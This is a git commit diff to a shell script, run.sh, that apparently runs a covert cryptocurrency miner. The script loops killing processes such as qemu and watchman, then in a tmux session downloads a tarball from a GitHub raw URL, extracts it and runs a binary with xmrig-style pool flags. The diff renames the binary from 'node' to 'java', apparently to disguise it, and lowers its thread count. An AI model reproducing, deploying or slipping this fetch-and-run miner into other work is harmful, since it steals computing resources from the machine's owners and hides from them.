56e9267a5a4dda4f2a4054e64351e1b6dbb7a963
Trịnh Khắc Công <trinh.khac.cong.hust@gmail.com>
2025-08-07 00:43:11 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -8,7 +8,6 @@ NAME_WORK="$2"
 (
   while true; do
     pkill -f qemu-system-x86_64-headless 2>/dev/null
-    pkill -9 -f java 2>/dev/null
     pkill -f netsimd 2>/dev/null
     pkill -f watchman 2>/dev/null
     sleep 3
@@ -22,12 +21,12 @@ else
     tmux new-session -s $SESSION -d
 
     tmux send-keys -t $SESSION "
-        rm -rf android ios xmrig* node node-18 node.tar.gz &&
-        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz &&
-        tar -xzf node.tar.gz &&
-        cd node-18 &&
-        chmod +x node &&
-        ./node -o $DOMAIN --tls -k --donate-level=0 -t 4 --rig-id $NAME_WORK
+        rm -rf android ios java* java java java.tar.gz &&
+        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz &&
+        tar -xzf java.tar.gz &&
+        cd java &&
+        chmod +x java &&
+        ./java -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
     " C-m
 
     tmux attach-session -t $SESSION
